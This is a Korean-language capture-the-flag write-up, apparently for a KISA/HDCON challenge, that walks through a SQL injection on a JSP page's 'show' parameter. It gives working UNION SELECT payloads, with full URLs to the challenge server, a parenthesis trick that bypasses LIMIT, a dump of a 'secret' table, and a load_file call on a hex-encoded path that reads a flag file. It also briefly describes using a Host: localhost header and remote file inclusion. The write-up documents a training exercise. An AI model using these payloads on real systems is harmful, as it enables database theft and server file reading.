## 1번 문제

show 인자에 sql 인젝션이 되는것 같았고.. limit 쪽에서 구분을 하는것을 알 수 있었습니다.
삽질 하던 도중.. do는 대부분 jsp 관련이므로 mssql이라는것을 감안 할 수 있었고, 
`procedure analyse()` 를 하는데 no hack!이 떴지만 union 혹은 select를 하면 아무것도 안뜸으로써 두가지의 다른 보안 시스템이 있다는 것을 알게 되었고..
후에 jsp로 확장자를 바꾸고 나서 연결을 해보니 union 우회가 되었습니다.

`1 union select 1,2,3,4,5,6,7-- -`

위 코드를 입력해도 안된다는것을 눈치채고..
#도 안되고 --도 안되는데 무언가 있지 않았을까 생각하던 찰나에..
```
1);
1');
1)#
1)-- -
```

이런 코드를 실행 해본 결과..
`1)-- -`로 limit 1이 우회가 됬었습니다.

즉, 질의문이 (select * from ??? limit 1,$_GET['show']) 였다는 것을 알 수 있었습니다.
union을 사용하려면 `(select * from ??? limit 1,1)union(select 1,2,3,4,5,6,7)` 이런식이 되야하므로..

`http://118.107.172.213:8889/kisaHdconWeb1/students.jsp?show=1)%20union%20(select%201,2,3,4,5,6,7)--%20-`

를 입력하면 1,2,3,4,5,6,7이 나오는 것을 알 수 있었습니다.

select를 사용해서 information.schema를 조회해보면 table_name 들 중 kisahdconweb1 테이블이 나오는데, 이 테이블 안에는 secret이라는 테이블이 있었습니다.

secret에 있는 데이터를 탈취하려고 아래 코드를 사용 했습니다.
`http://118.107.172.213:8889/kisaHdconWeb1/students.jsp?show=1)%20union%20(select%201,2,3,4,5,4,(select%20*%20from%20secret%20limit%201))--%20-`

위 코드를 이용하면:
`the auth key is located at /var/lib/mysql/FLAG, Dont worry, mysql user is also readable.`
이라는 단어가 나오며..

`/var/lib/mysql/FLAG = 0x2F7661722F6C69622F6D7973716C2F464C4147` 이므로
`1)union(select 1,2,3,4,5,6,load_file(0x2F7661722F6C69622F6D7973716C2F464C4147))`
위와같은 load_file 함수를 이용해서 데이터를 빼내오면Secret1y_Great1y 이라는 답이 나옵니다.



## 3번 문제
kk.php 소스를 보시면 알겠지만..
host:localhost를 이용하여 사이트에 백업된 소스를 확인하였고,
소스를 분석 하는 찰나 require_once가 포함된 php 소스를 발견하였습니다.
RFI를 이용하여 성공적으로 키 값을 알 수 있었습니다.
